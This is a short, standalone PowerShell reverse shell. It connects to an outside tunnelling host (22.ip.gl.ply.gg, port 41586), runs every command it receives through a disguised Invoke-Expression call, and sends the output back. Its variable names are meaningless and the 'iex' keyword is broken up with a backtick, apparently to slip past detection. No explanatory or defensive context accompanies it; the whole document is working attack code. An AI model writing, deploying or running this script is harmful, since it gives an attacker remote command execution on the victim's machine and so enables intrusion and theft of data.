$KLK = New-Object System.Net.Sockets.TCPClient('22.ip.gl.ply.gg','41586');
$PLP = $KLK.GetStream();
[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
$VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
$PLP.Write($VVCCA,0,$VVCCA.Length)
$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')
$PLP.Write($VVCCA,0,$VVCCA.Length)
[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);
$VZZS = (i`eX $DD 2>&1 | Out-String );
$HHHHHH  = $VZZS + (pwd).Path + '! ';
$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
$PLP.Write($L,0,$L.Length);
$PLP.Flush()};
$KLK.Close()
